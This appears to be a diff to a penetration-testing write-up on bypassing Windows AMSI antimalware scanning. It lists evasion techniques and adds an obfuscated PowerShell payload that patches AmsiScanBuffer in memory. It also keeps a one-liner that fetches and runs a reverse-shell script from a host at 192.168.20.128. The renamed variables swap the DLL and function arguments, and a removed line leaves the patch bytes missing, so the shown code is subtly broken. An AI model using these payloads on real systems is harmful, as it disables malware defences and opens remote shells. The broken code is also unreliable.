@@ -22,9 +22,12 @@ If a known signature is identified execution doesn’t initiate and a message ap
 # AMSI Bypass Technique
 The following evasive techniques aim to avoid detection by antivirus and security software.  
 
-Code Fragmentation: Divide codes into smaller components and assemble at runtime, evading static analysis.
-Obfuscation: Utilize obfuscation techniques to obscure the true intent of the script, making it challenging for AMSI scanners to interpret the code accurately.
-Memory patching: Modify the AMSI Dynamic Link Library (DLL) in memory to either disable or alter its functionality temporarily. 
+Code Fragmentation: Divide codes into smaller components and assemble at runtime, evading static analysis.  
+
+Obfuscation: Utilize obfuscation techniques to obscure the true intent of the script, making it challenging for AMSI scanners to interpret the code accurately.  
+
+Memory patching: Modify the AMSI Dynamic Link Library (DLL) in memory to either disable or alter its functionality temporarily.  
+
 Powershell Downgrade: Downgrade to Windows PowerShell 2.0. It lacks essential security controls like AMSI protection, making it susceptible to exploitation as a means of evasion.
 
 ## Proof of Concept
@@ -35,7 +38,8 @@ To verify that AMSI is correctly functioning, the tester first tried to initiate
 IEX (New-Object Net.WebClient).DownloadString('http://192.168.20.128:8443/Invoke-PowerShellTcp.ps1')
 ```
 However, as seen above, AMSI sucessfully flags the activity as  `malicious` and proceeds to block the reverse shell connection. 
-In order to bypass the AMSI, the tester 
+## Memory Patching
+In order to bypass AMSI, the tester utilzed the following payload. This patches the AmsiScanBuffer() function in order to return always `AMSI_RESULT_CLEAN` which indicates that no detection has been found. 
 ```bash
 $thing = @"
 // thing 
@@ -66,21 +70,17 @@ $byteArrayFun[3] = $Patch[3]
 $byteArrayFun[4] = $Patch[4]
 $byteArrayFun[5] = $Patch[5]
 
-$why = "Am" +"s" + "iSc" + "a" + "nBu" + "ffer"
-$hmm = "a" + "m" + "si" + ".dl" + "l"
-$librarz = [payload]::LoadLibrary($hmm)
-$dest = [payload]::GetProcAddress($librarz, $why)
+$to = "Am" +"s" + "iSc" + "a" + "nBu" + "ffer"
+$connect = "a" + "m" + "si" + ".dl" + "l"
+$librarz = [payload]::LoadLibrary($to)
+$dest = [payload]::GetProcAddress($librarz, $connect)
 $p = 0
 [payload]::VirtualProtect($dest, [uint32]5, 0x40, [ref]$p)
 
 [System.Runtime.InteropServices.Marshal]::Copy($byteArrayFun, 0, $dest, 6)
 ```
+The patch is displayed in the following line:
 
-## Memory Patching
-Daniel Duggan released an AMSI bypass which patches the AmsiScanBuffer() function in order to return always AMSI_RESULT_CLEAN which indicates that no detection has been found. The patch is displayed in the following line:
-```bash 
-static byte[] x64 = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
-```
 
 
 
@@ -88,4 +88,4 @@ static byte[] x64 = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
 ## Weaponization
 
 ## Reference
-- Read team playbook, Offensive Security
+-레드팀 플레이북 Read team playbook, Offensive Security
